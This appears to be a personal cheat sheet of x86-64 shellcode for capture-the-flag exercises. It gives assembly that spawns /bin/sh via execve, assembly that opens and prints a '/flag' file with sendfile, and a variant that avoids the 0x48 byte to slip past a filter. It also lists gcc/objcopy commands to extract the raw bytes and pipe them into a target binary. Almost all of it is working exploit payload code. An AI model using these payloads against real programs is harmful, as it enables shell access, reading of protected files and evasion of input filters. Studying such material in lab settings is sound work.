# SIMPLE BIN SH 

```shell
.global _start
_start:
.intel_syntax noprefix
mov rax, 59		# this is the syscall number of execve
lea rdi, [rip+binsh]	# points the first argument of execve at the /bin/sh string below
mov rsi, 0		# this makes the second argument, argv, NULL
mov rdx, 0		# this makes the third argument, envp, NULL
syscall			# this triggers the system call
binsh:				# a label marking where the /bin/sh string is
.string "/bin/sh"
```

# READ FILE
```shell
.global _start
_start:
.intel_syntax noprefix
mov rbx, 0x00000067616c662f	# push "/flag" filename
push rbx
mov rax, 2				# syscall number of open
mov rdi, rsp				# point the first argument at stack (where we have "/flag")
mov rsi, 0				# NULL out the second argument (meaning, O_RDONLY)
syscall				# trigger open("/flag", NULL)
mov rdi, 1				# first argument to sendfile is the file descriptor to output to (stdout)
mov rsi, rax				# second argument is the file descriptor returned by open
mov rdx, 0				# third argument is the number of bytes to skip from the input file
mov r10, 1000				# fourth argument is the number of bytes to transfer to the output file
mov rax, 40				# syscall number of sendfile
syscall				# trigger sendfile(1, fd, 0, 1000)
mov rax, 60				# syscall number of exit
syscall				# trigger exit()
```

# RUN WITH PROMPT
+ gcc -nostdlib -static shellcode2.s -o shellcode-elf
+ objcopy --dump-section .text=shellcode-raw shellcode-elf
+ (cat shellcode-raw; cat) | ./blah


# SH WITH NO MOV(0x48)
```shell
.global _start
_start:
.intel_syntax noprefix
#int3
add rax, 59             # this is the syscall number of execve
lea rdi, [rip+binsh]    # points the first argument of execve at the /bin/sh string below
xor rsi, rsi            # this makes the second argument, argv, NULL
xor rdx, rdx            # this makes the third argument, envp, NULL
syscall                 # this triggers the system call
binsh:                          # a label marking where the /bin/sh string is
.string "/bin/sh"
```